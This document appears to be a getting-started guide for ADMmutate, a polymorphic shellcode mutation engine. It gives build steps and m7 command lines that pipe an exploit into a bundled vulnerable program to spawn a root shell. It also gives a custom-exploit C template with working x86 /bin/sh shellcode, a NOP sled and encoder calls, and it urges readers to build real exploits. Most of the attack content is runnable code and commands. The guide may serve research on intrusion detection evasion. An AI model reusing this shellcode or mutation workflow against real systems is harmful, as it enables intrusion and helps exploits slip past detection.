# Getting Started with ADMmutate

Welcome to ADMmutate! This guide will help you get up and running with the polymorphic shellcode mutation engine.

## 🎯 What You'll Learn


## Prerequisites

### System Requirements

```mermaid
%%{init: {'theme':'base', 'themeVariables': {'primaryColor':'#1a1a2e','primaryTextColor':'#fff'}}}%%
graph TD
    A[Prerequisites] --> B[Compiler]
    A --> C[Build Tools]
    A --> D[Operating System]
    
    B --> B1[GCC 3.x or higher]
    B --> B2[Supports C89/C90]
    
    C --> C1[GNU Make]
    C --> C2[Standard C library]
    
    D --> D1[Linux ✅]
    D --> D2[BSD variants ✅]
    D --> D3[Solaris ✅]
    D --> D4[HP-UX ✅]
    D --> D5[Others ⚠️]
    
    style A fill:#e94560,stroke:#c72c48,color:#fff
    style B fill:#0f3460,stroke:#16a085,color:#fff
    style C fill:#0f3460,stroke:#16a085,color:#fff
    style D fill:#0f3460,stroke:#16a085,color:#fff
```



**Minimum Requirements:**
- GCC compiler (version 3.0+)
- GNU Make
- POSIX-compliant operating system
- Basic understanding of C programming
- Familiarity with shellcode and exploits

**Recommended:**
- Root/administrator access for testing
- Debugger (GDB) for learning
- Network testing environment

## Installation

### Step 1: Clone the Repository

```bash
git clone https://github.com/K2/ADMMutate.git
cd ADMMutate
```

### Step 2: Configure for Your Platform


Open `Makefile` in your favorite editor:

```makefile
# Uncomment your operating system
OS=-DLINUX
#OS=-DHPUX
#OS=-DBSD
#OS=-DOS5
#OS=-DTRU64

# Configure for your architecture's random seed
CFLAGS=-O -DDSRAND -DIA32_RND
#CFLAGS=-O -DDSRAND -DSPARCV9_RND
#CFLAGS=-O -DDSRAND -DHPPA_RND
```

**Architecture-Specific Notes:**

| Architecture | Flag | Description |
|--------------|------|-------------|
| IA32 (x86) | `-DIA32_RND` | Uses RDTSC instruction for high-resolution seeding |
| SPARC | `-DSPARCV9_RND` | Uses TICK register |
| HPPA | `-DHPPA_RND` | Uses TIMER register |

### Step 3: Build

```bash
make clean
make
```

**Expected Output:**
```
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -O -DDSRAND -DIA32_RND -c -o ADMmuteng.o ADMmuteng.c -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -O -DDSRAND -DIA32_RND -o m7 m7.c ADMmuteng.o -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -o exp exp.c -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -o expx expx.c ADMmuteng.o -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -o vulnerable vulnerable.c -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -o vulnerable-remote vulnerable-remote.c -DLINUX
gcc -DDEBUG -g3 -ggdb -DDEBUG_MORE -o qp qp.c ADMmuteng.o
```

**Verify Build:**
```bash
ls -l m7 exp expx vulnerable
```

You should see all executables created.

## First Run: The m7 Demo

The `m7` tool is a mutation filter that demonstrates ADMmutate's capabilities.

### Understanding m7


### m7 Command Line Options

```bash
./m7 [options]
```

| Option | Description | Example |
|--------|-------------|---------|
| `-i` | Use IA32 architecture | `-i` |
| `-s` | Use SPARC architecture | `-s` |
| `-h` | Use HPPA architecture | `-h` |
| `-o OFFSET` | Specify offset address | `-o 0xbffff63e` |
| `-n NOP` | Specify NOP byte value | `-n 0x90` |
| `-x FILE` | Read from binary file | `-x ./exp` |
| `-U` | Enable toupper() resilience | `-U` |
| `-l` | Enable tolower() resilience | `-l` |
| `-c` | Output as C array | `-c` |
| `-u` | Enable offset modulation | `-u` |
| `-t NUM` | Truncate buffer by NUM bytes | `-t 100` |

### Basic Examples

#### Example 1: Simple Mutation from stdin

```bash
./exp | ./m7 -i -o 0xbffff63e -n 0x90
```


#### Example 2: Mutation from File

```bash
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp
```

#### Example 3: With toupper() Resilience

```bash
./m7 -i -U -o 0xbffff67e -n 0x90 -x ./exp
```

#### Example 4: Output as C Array

```bash
./m7 -i -c -o 0xbffff67e -n 0x90 -x ./exp > shellcode.c
```

**Output Format:**
```c
char shellcode[] = {
    0x42, 0x27, 0x40, 0x4c, 0x44, 0x45, 0x49, 0x43,
    /* ... */
};
```

## Testing Your Setup

### Test 1: Local Exploitation

```mermaid
%%{init: {'theme':'dark'}}%%
flowchart TD
    A[Start Test] --> B[Generate Polymorphic Exploit]
    B --> C[./vulnerable with mutated input]
    C --> D{Successful?}
    D -->|Yes| E[✅ Shell Spawned]
    D -->|No| F[❌ Debug Required]
    
    E --> G[Type: exit]
    G --> H[Test Complete]
    
    F --> I[Check addresses]
    F --> J[Check architecture]
    F --> K[Check constraints]
    
    style A fill:#0f3460,stroke:#16a085,color:#fff
    style E fill:#388e3c,stroke:#2e7d32,color:#fff
    style F fill:#e94560,stroke:#c72c48,color:#fff
    style H fill:#1a472a,stroke:#2d7a45,color:#fff
```



**Run the test:**

```bash
./vulnerable `./exp | ./m7 -i -o 0xbffff63e -n 0x90`
```

**Expected Output:**
```
jmp = [0xbffff63e]      offset = [-550]
args 2
doing stuffz...
sh-2.03#
```

Type `exit` to return to your normal shell.

### Test 2: Verify Uniqueness

Run the mutation multiple times and compare outputs:

```bash
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp > output1.bin
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp > output2.bin
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp > output3.bin

md5sum output*.bin
```

Each file should have a different MD5 hash, proving polymorphism!


## Your First Custom Exploit

### Basic Template

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "ADMmutapi.h"

#define BUFFER_SIZE 1024
#define NOP_SIZE 500

int main() {
    char buffer[BUFFER_SIZE];
    struct morphctl mut;
    
    // Your shellcode here
    char shellcode[] = 
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
        "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        "\x53\x89\xe1\xb0\x0b\xcd\x80";
    
    // Step 1: Configure mutation
    mut.upper = 0;
    mut.lower = 0;
    mut.banned = "\x00\x0a\x0d";  // Ban NULL, LF, CR
    mut.arch = IA32;
    
    // Step 2: Initialize
    if (init_mutate(&mut) != 0) {
        fprintf(stderr, "Init failed\n");
        return 1;
    }
    
    // Step 3: Prepare buffer
    memset(buffer, 0x90, BUFFER_SIZE);
    memcpy(buffer + NOP_SIZE, shellcode, strlen(shellcode));
    
    // Step 4: Mutate!
    apply_key(buffer, strlen(shellcode), NOP_SIZE, &mut);
    apply_jnops(buffer, NOP_SIZE, mut);
    apply_engine(buffer, strlen(shellcode), NOP_SIZE, mut);
    
    // Step 5: Use buffer in your exploit
    // ... send to vulnerable target ...
    
    return 0;
}
```

### Build Your Exploit

```bash
gcc -o my_exploit my_exploit.c ADMmuteng.o -DLINUX
```

### Run It

```bash
./my_exploit
```

## Common Issues & Solutions

### Issue: Build Fails with Missing Headers


**Solution:**
```bash
# Debian/Ubuntu
sudo apt-get install build-essential

# RedHat/CentOS
sudo yum groupinstall "Development Tools"

# FreeBSD
sudo pkg install gcc
```

### Issue: No Valid Key Found

**Symptom:**
```
apply_key() returned non-zero
No valid encoding key found
```

**Causes & Solutions:**


**Solution:**
1. Reduce `mut.banned` characters
2. Disable `mut.upper` or `mut.lower` if both are set
3. Test shellcode independently
4. Try `IA32_SLIDE` for larger keyspace

### Issue: Exploit Doesn't Work After Mutation

**Debug Checklist:**


**Common Fixes:**
1. Verify offset calculation (remember decoder length!)
2. Ensure return address points into NOP sled
3. Test shellcode independently before mutation
4. Check `mut.arch` matches target architecture

## Next Steps

```mermaid
%%{init: {'theme':'base', 'themeVariables': {'primaryColor':'#1a1a2e','primaryTextColor':'#fff'}}}%%
graph TD
    A[✅ You've completed<br/>Getting Started!] --> B[What's Next?]
    
    B --> C[📖 Read Architecture Guide]
    B --> D[📚 Study API Reference]
    B --> E[💡 Try Examples]
    B --> F[🔧 Build Real Exploits]
    
    C --> G[Understand internals]
    D --> H[Master the API]
    E --> I[Learn patterns]
    F --> J[Apply knowledge]
    
    style A fill:#388e3c,stroke:#2e7d32,color:#fff
    style B fill:#e94560,stroke:#c72c48,color:#fff
```



### Recommended Reading Order

1. **[Architecture Guide](ARCHITECTURE.md)** - Understand how ADMmutate works internally
2. **[API Reference](API_REFERENCE.md)** - Deep dive into each function
3. **[Examples](EXAMPLES.md)** - See real-world usage patterns
4. **Original README** - Historical context and additional details

### Practice Exercises

1. **Exercise 1**: Create mutations with different architectures
2. **Exercise 2**: Test `toupper()` and `tolower()` resilience
3. **Exercise 3**: Measure performance with different constraints
4. **Exercise 4**: Analyze decoder output with a disassembler
5. **Exercise 5**: Integrate into an existing exploit

## Getting Help

### Resources

- **Documentation**: Check the `docs/` directory
- **Source Code**: Read `ADMmuteng.c` with comments
- **Examples**: Study `exp.c`, `expx.c`, `m7.c`
- **Issues**: Report bugs via GitHub issues

### Debug Mode

Enable debug output by uncommenting in Makefile:

```makefile
DEBUG=-DDEBUG -g3 -ggdb -DDEBUG_MORE
```

This provides verbose output showing:
- Key search process
- Decoder generation
- Instruction selection
- Buffer modifications

---

**Congratulations!** You're now ready to use ADMmutate. 🎉

**Next**: [Architecture Guide](ARCHITECTURE.md) →
